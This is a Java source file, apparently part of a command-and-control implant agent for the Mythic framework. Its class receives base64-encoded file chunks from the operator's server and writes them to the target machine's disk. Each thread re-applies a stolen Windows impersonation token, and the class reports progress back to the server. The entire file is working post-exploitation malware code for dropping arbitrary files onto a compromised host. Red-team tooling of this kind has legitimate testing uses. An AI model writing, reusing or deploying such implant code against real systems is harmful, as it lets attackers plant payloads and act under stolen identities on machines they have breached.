package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.io.FileOutputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * Background task handler for file uploads
 * Runs in a separate thread, receives chunks from Mythic and writes to file system
 */
public class UploadBackgroundTask implements Runnable {
    
    private final BackgroundTask task;
    private final Config config;
    private final String fullPath;
    private final String fileId;
    private final com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken;
    
    public UploadBackgroundTask(BackgroundTask task, Config config, String fullPath, String fileId, com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken) {
        this.task = task;
        this.config = config;
        this.fullPath = fullPath;
        this.fileId = fileId;
        this.impersonationToken = impersonationToken;
    }
    
    @Override
    public void run() {
        try {
            // Re-apply impersonation token if present (each thread needs its own token applied)
            if (impersonationToken != null) {
                Config.debugLog(config, "Re-applying impersonation token in upload background thread");
                com.woopsie.utils.WindowsAPI.reApplyToken(impersonationToken);
            }
            
            Config.debugLog(config, "Upload background task started for: " + fullPath);
            Config.debugLog(config, "[DEBUG] Upload thread alive, task.running=" + task.running + ", taskId=" + task.taskId);
            
            Path filePath = Paths.get(fullPath);
            
            // Create parent directories if they don't exist
            Path parentDir = filePath.getParent();
            if (parentDir != null && !java.nio.file.Files.exists(parentDir)) {
                Config.debugLog(config, "Creating parent directories: " + parentDir);
                java.nio.file.Files.createDirectories(parentDir);
            }
            
            // Create FileOutputStream to write chunks
            try (FileOutputStream fos = new FileOutputStream(filePath.toFile())) {
                
                int chunkNum = 1;
                int totalChunks = -1; // Will be set from first message
                
                Config.debugLog(config, "[DEBUG] Upload task entering receive loop, waiting for chunks...");
                while (task.running) {
                    // Wait for chunk data from Mythic
                    Config.debugLog(config, "[DEBUG] Upload task about to call receiveFromTask() for chunk " + chunkNum);
                    JsonNode message = task.receiveFromTask();
                    Config.debugLog(config, "[DEBUG] Upload task received message: " + (message != null ? message.toString() : "null"));
                    
                    if (message == null) {
                        Config.debugLog(config, "Upload background task received null message, exiting");
                        break;
                    }
                    
                    Config.debugLog(config, "Upload received message for chunk " + chunkNum);
                    
                    // Extract chunk data
                    if (!message.has("chunk_data")) {
                        throw new Exception("No chunk_data in upload message");
                    }
                    
                    String chunkDataB64 = message.get("chunk_data").asText();
                    byte[] chunkData = Base64.getDecoder().decode(chunkDataB64);
                    
                    // Write chunk to file
                    fos.write(chunkData);
                    fos.flush(); // Ensure data is written to disk
                    Config.debugLog(config, "Wrote chunk " + chunkNum + " (" + chunkData.length + " bytes) to " + fullPath);
                    
                    // Get total chunks from first message
                    if (totalChunks == -1 && message.has("total_chunks")) {
                        totalChunks = message.get("total_chunks").asInt();
                        Config.debugLog(config, "Total chunks to receive: " + totalChunks);
                    }
                    
                    // Check if this was the last chunk
                    if (totalChunks > 0 && chunkNum >= totalChunks) {
                        Config.debugLog(config, "All chunks received, upload complete");
                        break;
                    }
                    
                    chunkNum++;
                    
                    // Send acknowledgment requesting next chunk
                    Map<String, Object> uploadAck = new HashMap<>();
                    uploadAck.put("chunk_size", UploadTask.CHUNK_SIZE);
                    uploadAck.put("file_id", fileId);
                    uploadAck.put("chunk_num", chunkNum); // Request next chunk
                    uploadAck.put("full_path", fullPath);
                    
                    Map<String, Object> ackResponse = new HashMap<>();
                    ackResponse.put("task_id", task.taskId);
                    ackResponse.put("upload", uploadAck);
                    // Only show progress every 10 chunks to avoid spam
                    if (chunkNum % 10 == 0 || chunkNum == totalChunks) {
                        ackResponse.put("user_output", "Uploading chunk " + chunkNum + (totalChunks > 0 ? "/" + totalChunks : "") + "\n");
                    }
                    
                    task.sendResponse(ackResponse);
                }
            } // FileOutputStream auto-closes here, ensuring flush completes
            
            // Verify file exists and has content after stream is fully closed
            if (java.nio.file.Files.exists(filePath)) {
                long fileSize = java.nio.file.Files.size(filePath);
                Config.debugLog(config, "Upload complete - file exists with size: " + fileSize + " bytes");
            } else {
                throw new Exception("Upload failed - file does not exist after write");
            }
            
            // Send completion message
            Map<String, Object> completionResponse = new HashMap<>();
            completionResponse.put("task_id", task.taskId);
            completionResponse.put("completed", true);
            completionResponse.put("status", "success");
            completionResponse.put("user_output", "Uploaded '" + fullPath + "'");
            
            task.sendResponse(completionResponse);
            Config.debugLog(config, "Upload background task completed successfully");
            Config.debugLog(config, "[DEBUG] Upload thread exiting normally");
            
        } catch (Exception e) {
            Config.debugLog(config, "Upload background task error: " + e.getMessage());
            Config.debugLog(config, "[DEBUG] Upload thread exiting due to exception");
            if (config.isDebug()) {
                e.printStackTrace();
            }
            
            // Send error response
            Map<String, Object> errorResponse = new HashMap<>();
            errorResponse.put("task_id", task.taskId);
            errorResponse.put("completed", true);
            errorResponse.put("status", "error");
            errorResponse.put("user_output", "Upload failed: " + e.getMessage());
            
            task.sendResponse(errorResponse);
        }
    }
}
